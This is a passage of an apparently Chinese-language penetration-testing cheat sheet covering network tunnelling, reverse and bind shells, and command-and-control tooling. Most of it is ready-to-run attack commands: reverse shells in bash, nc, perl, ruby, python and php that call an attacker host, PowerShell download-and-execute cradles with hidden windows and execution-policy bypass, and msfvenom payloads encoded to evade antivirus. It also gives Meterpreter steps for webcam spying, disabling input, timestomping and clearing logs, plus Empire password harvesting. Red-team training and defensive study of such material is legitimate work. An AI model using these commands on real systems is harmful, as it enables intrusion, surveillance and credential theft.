&gt;ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22
</code></pre>
<h4 id="反向转发"><a href="#反向转发" class="headerlink" title="反向转发"></a>反向转发</h4><pre><code>外网攻击107
内网靶机97
出网靶机编辑后restart ssh服务
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
&gt;ssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22
出网靶机执行，把外部攻击机33890转发到内部隔离网络的3389
&gt;netstat –tnlp
</code></pre>
<p><img src="165.png" alt="image"></p>
<pre><code>转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)
&gt;vim /etc/rinetd.conf
添加0.0.0.0 3389 127.0.0.1 33890
&gt;service rinetd start
</code></pre>
<p><img src="166.png" alt="image"></p>
<pre><code>看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面
</code></pre>
<p><img src="167.png" alt="image"></p>
<h3 id="Invoke-SocksProxy"><a href="#Invoke-SocksProxy" class="headerlink" title="Invoke-SocksProxy"></a>Invoke-SocksProxy</h3><pre><code>https://gitee.com/RichChigga/Invoke-SocksProxy
&gt;Import-Module .\Invoke-SocksProxy.psm1 
&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接
</code></pre>
<p><img src="168.png" alt="image"><br><img src="169.png" alt="image"></p>
<h3 id="SSF"><a href="#SSF" class="headerlink" title="SSF"></a>SSF</h3><h4 id="单层网络正向转发"><a href="#单层网络正向转发" class="headerlink" title="单层网络正向转发"></a>单层网络正向转发</h4><pre><code>https://github.com/securesocketfunneling/ssf/releases
内网机执行：
&gt;ssfd.exe -p 1080
</code></pre>
<p><img src="170.png" alt="image"></p>
<pre><code>边界机器执行
&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 
把内网10.1.1.108的SSH转发出来
</code></pre>
<p><img src="171.png" alt="image"></p>
<pre><code>边界机器访问内网端口
</code></pre>
<p><img src="172.png" alt="image">    </p>
<h4 id="单层网络反向转发"><a href="#单层网络反向转发" class="headerlink" title="单层网络反向转发"></a>单层网络反向转发</h4><pre><code>边界机器执行：
&gt;ssfd.exe -p 1080
</code></pre>
<p><img src="173.png" alt="image">    </p>
<pre><code>内网机器执行：
&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106
</code></pre>
<p><img src="174.png" alt="image"><br><img src="175.png" alt="image"></p>
<h3 id="Netsh"><a href="#Netsh" class="headerlink" title="Netsh"></a>Netsh</h3><pre><code>边界机器执行：
&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22
将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH
</code></pre>
<p><img src="176.png" alt="image"></p>
<pre><code>&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389
当靶机某服务只允许内网访问时，将端口转发出来
</code></pre>
<p><img src="177.png" alt="image"></p>
<pre><code>添加防火墙规则：
&gt;netsh advfirewall firewall add rule name=&quot;RDP&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow
列出所有转发规则:
&gt;netsh interface portproxy show all
</code></pre>
<p><img src="178.png" alt="image"></p>
<pre><code>删除指定的端口转发规则：
&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98
删除所有转发规则：
&gt;netsh interface portproxy reset
</code></pre>
<h3 id="Iptables"><a href="#Iptables" class="headerlink" title="Iptables"></a>Iptables</h3><pre><code>需开启ip转发功能
&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1
</code></pre>
<p><img src="179.png" alt="image"><br><img src="180.png" alt="image"></p>
<pre><code>本地端口22转发到2222上
&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22
内网98机器3389转到本机110的6789上
&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389
&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110
</code></pre>
<p><img src="181.png" alt="image"></p>
<pre><code>查看规则
&gt;iptables -t nat -L
删除规则
&gt;iptables -t nat -D PREROUTING 1
删除全部规则
&gt;iptables -t nat –F
</code></pre>
<h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><pre><code>https://github.com/jpillora/chisel
攻击机执行
&gt;chisel server -p 12138 –reverse
</code></pre>
<p><img src="182.png" alt="image"></p>
<pre><code>靶机执行
&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389
</code></pre>
<p><img src="183.png" alt="image"></p>
<pre><code>建立成功后，攻击机连接本机1234端口即可访问靶机3389
</code></pre>
<p><img src="184.png" alt="image"></p>
<h2 id="命令-amp-控制"><a href="#命令-amp-控制" class="headerlink" title="命令&amp;控制"></a>命令&amp;控制</h2><h3 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h3><pre><code>&gt;python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
&gt;expect -c &#39;spawn bash;interact&#39;
</code></pre>
<h3 id="Script-reverse-shell"><a href="#Script-reverse-shell" class="headerlink" title="Script reverse shell"></a>Script reverse shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><pre><code>&gt;/bin/bash -i &gt; /dev/tcp/attackerip/4444 0&lt;&amp;1 2&gt;&amp;1
</code></pre>
<p><img src="185.png" alt="image"></p>
<pre><code>&gt;bash -i &gt;&amp; /dev/tcp/attackerip/4444 0&gt;&amp;1
</code></pre>
<p><img src="186.png" alt="image"></p>
<pre><code>&gt;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
</code></pre>
<p><img src="187.png" alt="image"></p>
<pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=attackerip LPORT=4444 -o shell.sh
</code></pre>
<p><img src="188.png" alt="image"></p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><pre><code>&gt;nc -e /bin/sh attackerip 4444
&gt;nc -Lp 31337 -vv -e cmd.exe
&amp;
&gt;mknod backpipe p; nc 192.168.0.107 12138 0&lt;backpipe | /bin/bash 1&gt;backpipe
&gt;nc 192.168.0.10 31337
</code></pre>
<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre><code>&gt;mknod backpipe p; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe
</code></pre>
<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre><code>#php -r &#39;$sock=fsockopen(&quot;IP&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.0.107/1234 0&gt;&amp;1&#39;&quot;);?&gt;
</code></pre>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre><code>&gt;python -c &#39; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]); &#39;
&gt;msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
&gt;import socket,struct,time for x in range(10): try: s=socket.socket(2,socket.SOCK_STREAM) s.connect((&#39;IP&#39;,端口)) break except: time.sleep(5) l=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0] d=s.recv(l) while len(d)
</code></pre>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><pre><code>&gt;perl -e &#39;use Socket;$i=&quot; attackerip &quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
&gt;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
&gt;perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;  #####windows
</code></pre>
<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><pre><code>&gt;ruby -rsocket -e&#39;f=TCPSocket.open(&quot;attackerip &quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
&gt;ruby -rsocket -e &#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;   #####windows
</code></pre>
<h3 id="OpenSSL-encrypt-shell"><a href="#OpenSSL-encrypt-shell" class="headerlink" title="OpenSSL encrypt shell"></a>OpenSSL encrypt shell</h3><pre><code>生成证书
&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
</code></pre>
<p><img src="189.png" alt="image"></p>
<h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><pre><code>监听
&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
</code></pre>
<p><img src="190.png" alt="image"></p>
<pre><code>靶机执行
&gt;mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.108:1337 &gt; /tmp/s; rm /tmp/s
</code></pre>
<p><img src="191.png" alt="image"></p>
<pre><code>此方式使用TLS1.2 协议对通信进行加密
</code></pre>
<h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><pre><code>攻击机需监听2个端口，一个端口发送命令，一个端口接收回显
发送
&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
接收
&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1338
靶机执行
&gt;openssl s_client -quiet -connect 192.168.0.108:1337|cmd.exe|openssl s_client -quiet -connect 192.168.0.108:1338
</code></pre>
<p><img src="192.png" alt="image"><br><img src="193.png" alt="image"><br><img src="194.png" alt="image"></p>
<h3 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h3><pre><code>安装dnscat2
&gt;apt-get -y install ruby-dev git make g++
&gt;gem install bundler
&gt;git clone https://github.com/iagox86/dnscat2.git
&gt;cd dnscat2/server
&gt;bundle install
执行
&gt;ruby dnscat2.rb abc.com -e open --no-cache
</code></pre>
<p><img src="195.png" alt="image"></p>
<h4 id="Powercat"><a href="#Powercat" class="headerlink" title="Powercat"></a>Powercat</h4><pre><code>靶机执行
&gt;powercat -c 192.168.0.108 -v -dns abc.com -e cmd.exe
</code></pre>
<p><img src="196.png" alt="image"></p>
<pre><code>dnscat2执行
&gt;session -i 1进入会话
</code></pre>
<p><img src="197.png" alt="image"></p>
<h4 id="Dnscat2-exe"><a href="#Dnscat2-exe" class="headerlink" title="Dnscat2 exe"></a>Dnscat2 exe</h4><pre><code>Linux
https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x86.tar.bz2 https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x64.tar.bz2
https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip
攻击机执行
&gt;ruby dnscat2.rb --dns &quot;domain=zone.com,host=192.168.0.108&quot; --no-cache
靶机执行
&gt;dnscat2-v0.07-client-win32.exe --dns server=192.168.0.108
</code></pre>
<p><img src="198.png" alt="image"></p>
<pre><code>攻击机执行
&gt;session -i [ID]进入会话
</code></pre>
<p><img src="199.png" alt="image"><br><img src="200.png" alt="image"></p>
<h3 id="DNS-TXT-Command"><a href="#DNS-TXT-Command" class="headerlink" title="DNS TXT Command"></a>DNS TXT Command</h3><pre><code>https://github.com/samratashok/nishang/Utility/Out-DnsTxt.ps1
https://github.com/samratashok/nishang/Backdoors/DNS_TXT_Pwnage.ps1
新建一个psh文件，使用out-dnstxt转换，这里的命令是net user
</code></pre>
<p><img src="201.png" alt="image"><br><img src="202.png" alt="image"></p>
<pre><code>y0stUSgtTi3i5QIA
添加一条域名txt记录，这里在本地设置，正常是在域名商的网站里配置
</code></pre>
<p><img src="203.png" alt="image"></p>
<pre><code>还需创建两个txt记录，分别是指定开始和结束的字符串
</code></pre>
<p><img src="204.png" alt="image"><br><img src="205.png" alt="image"></p>
<pre><code>靶机执行
&gt;Import-Module .\DNS_TXT_Pwnage.ps1
&gt;DNS_TXT_Pwnage -startdomain start.zone.com -cmdstring cmd -commanddomain 1.zone.com -psstring start -psdomain zone.com -Subdomains 1 -StopString stop
</code></pre>
<p><img src="206.png" alt="image"></p>
<h3 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="MSF-Powershell"><a href="#MSF-Powershell" class="headerlink" title="MSF+Powershell"></a>MSF+Powershell</h4><pre><code>反弹MSF
靶机
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1&#39;) 
PS &gt;Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.0.100 -lport 6666 -force
攻击机：
&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/reverse_ https
&gt;run
或
&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f powershell -o /var/www/html/ps
&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1&quot;)
&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/ps&quot;)
&gt;Invoke-Shellcode -Shellcode ($buf)
或
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f psh-reflection &gt;/var/www/html/a.ps1
&gt;powershell -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/a.ps1&#39;)&quot;
</code></pre>
<h4 id="Powercat-1"><a href="#Powercat-1" class="headerlink" title="Powercat"></a>Powercat</h4><pre><code>&gt;powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)
正向连接
靶机:powercat -l -p 8080 -e cmd.exe –v
攻击机:nc 192.168.0.1 8080 –vv
反向连接：
攻击机：nc –l –p 8080 –vv
靶机:powercat –c 192.168.0.1 –p 8080 –v –e cmd.exe
远程执行
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powercat/powercat.ps1&#39;); powercat -c 192.168.0.107 -p 12345 -v -e cmd.exe&quot;
正向连接
靶机:powercat -l -p 8080 -e cmd.exe -v
攻击机:nc 192.168.0.1 8080 -vv
反向连接：
攻击机：nc -l -p 8080 -vv
靶机:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe
</code></pre>
<p><img src="207.png" alt="image"></p>
<h4 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h4><h5 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h5><pre><code>靶机：
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Bind -Port 12138&quot;
攻击机：
&gt;nc 靶机IP 12138
</code></pre>
<h5 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h5><pre><code>攻击机：
&gt;nc -vnlp 9999
靶机：
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 9999&quot;
</code></pre>
<h5 id="UDP反向shell"><a href="#UDP反向shell" class="headerlink" title="UDP反向shell"></a>UDP反向shell</h5><pre><code>攻击机：
&gt;nc -lvup 12138
靶机：
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 12138&quot;
</code></pre>
<h5 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h5><pre><code>攻击机：
&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1&#39;); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443&quot;  IP地址是本机IP
</code></pre>
<p><img src="208.png" alt="image"></p>
<pre><code>靶机：
&gt;powershell -w hidden -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.98:8080/connect&#39;)
</code></pre>
<p><img src="209.png" alt="image"></p>
<h5 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h5><pre><code>攻击机IP:108
靶机IP:100
https://github.com/inquisb/icmpsh
靶机执行
&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp 192.168.0.108
</code></pre>
<p><img src="210.png" alt="image"></p>
<pre><code>攻击机执行，开启相应ICMP ECHO请求
&gt;sysctl -w net.ipv4.icmp_echo_ignore_all=1
&gt;./icmpsh_m.py 192.168.0.108 192.168.0.100
</code></pre>
<p><img src="211.png" alt="image"></p>
<h4 id="Base64-2"><a href="#Base64-2" class="headerlink" title="Base64"></a>Base64</h4><pre><code>&gt;Powershell &quot;$string=&quot;net user&quot;;[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))&quot;
</code></pre>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h4 id="常规使用"><a href="#常规使用" class="headerlink" title="常规使用"></a>常规使用</h4><pre><code>#systemctl start postgresql.service 启动数据库服务
#msfdb init 初始化数据库
#msfconsole进入MSF框架
#search  ms17-010 查找攻击模块
#use exploit/windows/smb/ms17_010_eternalblue 使用模块 
#set payload windows/x64/meterpreter/reverse_tcp 设置载荷
#info 查看信息
#show options查看需要设置的参数
#set RHOST 192.168.125.138设置参数
#exploit 执行攻击模块
#back 回退
</code></pre>
<h4 id="技巧使用"><a href="#技巧使用" class="headerlink" title="技巧使用"></a>技巧使用</h4><pre><code>#handler -H 192.168.0.10 -P 3333 -p windows/x64/meterpreter/reverse_tcp快速监听
#setg 设置全局参数
#set autorunscript migrate –f 自动迁移进程
#set autorunscript migrate -n explorer.exe
#set AutoRunScript post/windows/manage/migrate
#set prependmigrate true 自动注入进程
#set prependmigrateProc svchost.exe
#set exitonsession false获取到session后继续监听，获得多个session
#set stagerverifysslcert false 防止出现ssl错误
#set SessionCommunicationTimeout 0 防止session超时退出
#set SessionExpirationTimeout 0 防止强制关闭session
#exploit -j -z  后台持续监听
&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -e x86/shikata_ga_nai -b &quot;x00&quot; -i 5 -a x86 --platform windows PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  1.exe 执行后注入到已存在的一个进程
&gt;set EnableStageEncoding true
&gt;set stageencoder x86/fnstenv_mov 编码进行免杀
&gt;set stageencodingfallback false
</code></pre>
<h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><h5 id="Auxiliary"><a href="#Auxiliary" class="headerlink" title="Auxiliary"></a>Auxiliary</h5><pre><code>#show auxiliary 查看所有模块
</code></pre>
<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><pre><code>#show payloads 查看所有攻击载荷
Payload是目标被攻击时执行的实际功能代码
生成载荷
#use exploit/multi/script/web_delivery
&gt;set target 2
&gt;msfvenom --list payloads 列出所有payload
&gt;msfvenom --list encoders 列出所有编码器
</code></pre>
<h6 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h6><pre><code>#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe -o /root/1.exe
#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 3 -f exe -o 1.exe
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f psh-reflection &gt;xxx.ps1
#msfvenom -a x64 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
&gt;msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.0.1 LPORT=11111  -f exe&gt; /root/1.exe  生成NC正向连接
&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe&gt; 1.exe 生成NC反向连接
</code></pre>
<h6 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h6><pre><code>#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e -f elf -a x86 --platform linux -o shell
#msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.sh
</code></pre>
<h6 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h6><pre><code>#msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f macho &gt; shell.macho
</code></pre>
<h6 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h6><pre><code>#msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.php
#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f war &gt; shell.war
#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f aspx -o payload.aspx
#msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.jsp
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f asp &gt; shell.asp
</code></pre>
<h6 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h6><pre><code>#msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f apk -o payload.apk
#msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 -f raw &gt; shell.apk
#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 R &gt; test.apk
</code></pre>
<h6 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h6><pre><code>#msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.1 LPORT=11111 -f c –o /root/1.c
#msfvenom -p cmd/unix/reverse_python LHOST=192.168.0.1 LPORT=11111 -o shell.py
#msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.py
#msfvenom -p cmd/unix/reverse_perl LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.pl
#msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.rb
#msfvenom -p cmd/unix/reverse_lua LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.lua
</code></pre>
<h6 id="msf设置监听"><a href="#msf设置监听" class="headerlink" title="msf设置监听"></a>msf设置监听</h6><pre><code>#use exploit/multi/handler
#set payloadwindows/meterpreter/reverse_http 指定相应的payload
#set LHOST 192.168.0.1
#set LPORT 11111
#exploit -j 后台监听
或在exploit模块中直接使用set payload 命令指定payload
</code></pre>
<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h5 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h5><pre><code>当攻击成功后会返回会话，使用session -l命令列出当前获取到的会话
#session -l
使用
#sessions -i id 来进入一个会话进行交互
#background 将当前会话放置后台
#sessions -x检查心跳
#sessions -u [ID] cmdshell升级meterpreter shell
</code></pre>
<h5 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h5><pre><code>提权详见提权模块
</code></pre>
<h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><pre><code>#shell 进入目标cmdshell
#uictl [enable/disable] [keyboard/mouse/all]  开启或禁止键盘/鼠标
#uictl disable mouse  禁用鼠标
#uictl disable keyboard  禁用键盘
#webcam_list   查看摄像头
#webcam_snap   通过摄像头拍照
#webcam_stream  通过摄像头开启视频
#execute -H -i -f cmd.exe 执行cmd.exe，-H不可见，-i交互 
#execute -H -m -d calc.exe -f wce.exe -a &quot;-o 1.txt&quot; 隐藏执行
#ps查看当前活跃进程
#migrate pid     迁移进程
#kill pid   #杀死进程
</code></pre>
<h5 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h5><pre><code>#pwd 查看当前目录
#ls 列出当前目录文件
#search -f *pass*        搜索文件
#cat c:\\passwd.txt   查看文件内容
#upload /tmp/pwn.txt C:\\1.txt   上传文件
#download c:\\passwd.txt /tmp/  下载文件
#edit c:\\1.txt  编辑或创建文件
#rm C:\\1.txt 删除文件
#mkdir folder  创建文件夹
#rmdir folder  删除文件夹
#lcd /tmp   #攻击者主机 切换目录
#timestomp -v C://2.txt   #查看时间戳
#timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
</code></pre>
<h5 id="后渗透-amp-权限维持"><a href="#后渗透-amp-权限维持" class="headerlink" title="后渗透&amp;权限维持"></a>后渗透&amp;权限维持</h5><pre><code>路由添加，socks建立，后门建立等查看
查看后门&amp;持久化板块
</code></pre>
<h5 id="清理日志"><a href="#清理日志" class="headerlink" title="清理日志"></a>清理日志</h5><pre><code>#clearev 
</code></pre>
<h4 id="MSF派生Cobalt-strike和Empire"><a href="#MSF派生Cobalt-strike和Empire" class="headerlink" title="MSF派生Cobalt strike和Empire"></a>MSF派生Cobalt strike和Empire</h4><h5 id="派生Empire"><a href="#派生Empire" class="headerlink" title="派生Empire"></a>派生Empire</h5><pre><code>Empire创建一个Listener
创建一个stager选择windows/dll
MSF使用
&gt;use post/windows/manage/reflective_dll_inject 
指定session，dll的路径，进程pid
</code></pre>
<h5 id="派生Cobalt-Strike"><a href="#派生Cobalt-Strike" class="headerlink" title="派生Cobalt Strike"></a>派生Cobalt Strike</h5><pre><code>cobalt 开启一个监听器windows/beacon_http/reverse_http
msf 
&gt;use exploit/windows/manage/payload_inject
指定IP、端口、payload即可
</code></pre>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre><code>#git clone https://github.com/EmpireProject/Empire.git
#cd Empire/setup
#./install.sh
</code></pre>
<h4 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h4><pre><code>(Empire) &gt; listeners
(Empire: listeners) &gt; uselistener http
(Empire: listeners) &gt; info 查看参数信息
(Empire: listeners/http) &gt; set Name y
(Empire: listeners/http) &gt; set Host http://192.168.0.1
(Empire: listeners/http) &gt; set Port 8080
(Empire: listeners/http) &gt; execute
&gt;back命令返回listeners模块
&gt;list查看已激活的listener
&gt;kill http删除监听
</code></pre>
<h4 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h4><pre><code>(Empire: listeners) &gt; usestager windows/launcher_vbs (双击tab键查看所有模块)
(Empire: stager/windows/launcher_vbs) &gt; info
必须设置listener的名字，可设置生成位置
(Empire: stager/windows/launcher_vbs) &gt; set Listener y
(Empire: stager/windows/launcher_vbs) &gt; execute
可生成vbs，靶机执行即可上线。
使用launcher命令直接生成powershell或python脚本
&gt;launcher powershell Listener-Name
使用rename对agents更名
&gt;rename 6NMCW4ZB target1
使用main命令放回主菜单
&gt;list stale 列出失去权限的机器
&gt;remove stale 去除失去权限的机器
</code></pre>
<h4 id="连接靶机及其他操作"><a href="#连接靶机及其他操作" class="headerlink" title="连接靶机及其他操作"></a>连接靶机及其他操作</h4><pre><code>&gt;interact target1 连接
&gt;agent 返回靶机列表
&gt;back 返回上一层
&gt;shell net user 1 1 /add 执行系统目录格式
&gt;mimikazt 加载模块获取密码
&gt;creds 整理获取的密码，creds export /root/1.txt 保存密码，creds hash/plaintext，显示格式
